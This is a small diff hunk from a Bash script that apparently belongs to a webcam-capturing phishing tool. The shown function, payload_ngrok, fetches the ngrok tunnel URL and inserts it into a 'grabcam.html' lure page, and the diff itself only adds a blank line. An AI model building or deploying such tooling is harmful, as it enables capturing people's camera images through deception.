@@ -72,6 +72,7 @@ server() {
   printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$send_link"
 }
 
+
 payload_ngrok() {
   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
   sed "s+forwarding_link+$link+g" grabcam.html > index2.html
